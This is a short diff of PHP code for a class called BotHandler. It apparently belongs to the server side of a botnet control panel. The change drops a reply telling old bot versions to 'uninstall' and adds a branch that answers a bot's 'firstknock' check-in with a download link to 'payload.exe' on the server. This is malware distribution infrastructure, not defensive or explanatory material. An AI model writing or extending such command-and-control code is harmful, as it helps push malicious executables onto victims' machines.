@@ -45,11 +45,11 @@ class BotHandler
         $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
         $statementConfig->execute(array("1"));
         $config = $statementConfig->fetch();
+        $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
 
 
-        if (!empty($_POST["botversion"])) {
-            //Old version
-            die("uninstall");
+        if(!empty($_POST["firstknock"])){
+            die($actual_link."/payload.exe");
         }
 
         //  var_dump($_POST);
